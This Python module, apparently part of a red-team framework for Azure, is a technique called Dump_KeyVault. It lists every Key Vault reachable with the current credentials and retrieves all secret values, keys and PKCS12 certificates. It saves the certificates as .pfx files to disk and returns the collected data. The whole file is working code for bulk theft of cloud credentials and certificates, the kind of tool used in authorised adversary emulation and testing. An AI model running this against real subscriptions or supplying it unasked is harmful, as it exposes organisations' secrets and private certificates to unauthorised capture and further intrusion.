'''
Module Name : Dump_KeyVault
Module Description : Access and extract secrets, keys or certificates from Azure Key Vaults after gaining the necessary permissions. 
'''

from azure.keyvault.secrets import SecretClient
from azure.keyvault.keys import KeyClient
from azure.mgmt.keyvault import KeyVaultManagementClient
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from base64 import urlsafe_b64encode, urlsafe_b64decode
from core.AzureFunctions import GetAzureAuthCredential, GetCurrentSubscriptionAccessInfo

import jwt
import base64
import os

def TechniqueMain(subscription_id):
    '''Function to retrieve Key Vault data'''
    
    # input validation
    if subscription_id in ["", None]:
        # retrieve default set subscription id
        current_sub_info = GetCurrentSubscriptionAccessInfo()
        subscription_id = current_sub_info.get("id")
    
    # Initialize Azure credentials and KeyVaultManagementClient
    credential = GetAzureAuthCredential()
    client = KeyVaultManagementClient(credential, subscription_id)
    
    key_vault_data = {}
    
    try:
        for vault in client.vaults.list():
            vault_name = vault.name
            resource_group_name = vault.id.split("/")[4]
            print(f"Dumping {vault_name}")
            
            secrets_list = []
            keys_list = []
            certificates_list = []
            message = []
               
            try:
                # Initialize SecretClient and retrieve secrets
                secret_client = SecretClient(vault_url=f"https://{vault_name}.vault.azure.net/", credential=credential)
                secrets = secret_client.list_properties_of_secrets()
                
                for secret in secrets:
                    secret_name = secret.name
                    print(f"Getting Secret value for the {secret_name} Secret")
                    secret_value = secret_client.get_secret(secret_name)
                    secret_type = secret_value.properties.content_type
                    secret_value_text = secret_value.value

                    # Write certificate to file if it's a PKCS12 certificate
                    if secret_type == "application/x-pkcs12":
                        print(f"Writing certificate for {secret_name} to {secret_name}.pfx")
                        if not os.path.exists(f'certificate/{resource_group_name}'):
                            os.makedirs(f'certificate/{resource_group_name}')
                        if isinstance(secret_value_text, bytes):
                            with open(f"certificate/{resource_group_name}/{secret_name}.pfx", "wb") as file:
                                file.write(secret_value_text)
                        else:
                            try:
                                decoded_secret = base64.b64decode(secret_value_text)
                                with open(f"certificate/{resource_group_name}/{secret_name}.pfx", "wb") as file:
                                    file.write(decoded_secret)
                            except Exception as e:
                                print(f"Failed to decode and write the secret: {e}")
                                pass

                    if secret_type == "application/x-pkcs12":
                        certificates_list.append({"certificate_name": secret_name, "certificate_value": secret_value_text})
                    else:
                        secrets_list.append({"secret_name": secret_name, "secret_value": secret_value_text})

            except Exception as e:
                if "ForbiddenByPolicy" in str(e):
                    message.append("Error accessing secrets: Access Policy required for Secrets")
                elif "ForbiddenByRbac" in str(e):
                    message.append("You do not have access to this Key Vault: RBAC required")
                elif "AccessDenied" in str(e):
                    message.append("You do not have access to this Key Vault: Access Policy required")
                    
            try:
                # Initialize KeyClient and retrieve keys
                key_client = KeyClient(vault_url=f"https://{vault_name}.vault.azure.net/", credential=credential)
                keys = key_client.list_properties_of_keys()

                for key in keys:
                    key_name = key.name
                    print(f"Getting Key value for the {key_name} Key")
                    key_data = key_client.get_key(key_name)
                    key_type = key_data.key_type
                    key_value = key_data.key.n
                    key_data_text = key_value

                    # Convert RSA public key to PEM format
                    if key_type == "RSA":
                        usable_jwk = {k: urlsafe_b64encode(vars(key_data.key)[k]) if isinstance(vars(key_data.key)[k], bytes) else vars(key_data.key)[k] for k in vars(key_data.key) if vars(key_data.key)[k]}
                        public_key = jwt.algorithms.RSAAlgorithm.from_jwk(usable_jwk)
                        public_pem = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
                        key_data_text = public_pem

                    # Convert EC public key to PEM format
                    if key_type == "EC":
                        usable_jwk = {k: urlsafe_b64encode(vars(key_data.key)[k]).decode('utf-8') if isinstance(vars(key_data.key)[k], bytes) else vars(key_data.key)[k] for k in vars(key_data.key) if vars(key_data.key)[k]}
                        x = usable_jwk.get('x')
                        y = usable_jwk.get('y')
                        curve = usable_jwk.get('crv')

                        if x and y and curve:
                            x_bytes = urlsafe_b64decode(x + '==')
                            y_bytes = urlsafe_b64decode(y + '==')
                            curve = {'P-256': ec.SECP256R1(), 'P-384': ec.SECP384R1(), 'P-521': ec.SECP521R1()}.get(curve, None)
                            if curve:
                                public_key = ec.EllipticCurvePublicNumbers(int.from_bytes(x_bytes, 'big'), int.from_bytes(y_bytes, 'big'), curve).public_key()
                                public_pem = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
                                key_data_text = public_pem.decode('utf-8')

                    keys_list.append({"key_name": key_name, "key_value": f'{key_data_text}'})

            except Exception as e:
                if "ForbiddenByPolicy" in str(e):
                    message.append("Error accessing keys: Access Policy required for Keys and Certificates")
                elif "ForbiddenByRbac" in str(e):
                    pass
                    
            key_vault_data[vault_name] = {"secrets": secrets_list, "keys": keys_list, "certificates": certificates_list, "message": message}


        raw_response = {}
        pretty_response = {}
        pretty_response = key_vault_data
    
        return True, raw_response, pretty_response
    
    except Exception as e:
        return False, {"Error" : e}, None

# Function to define the input fields required for the technique execution
def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Subscription ID (Optional)", "id" : "subscription-id-text-input", "type" : "text", "placeholder" : "1234-5678-9098-7654-3210", "element_type" : "dcc.Input"},
    ]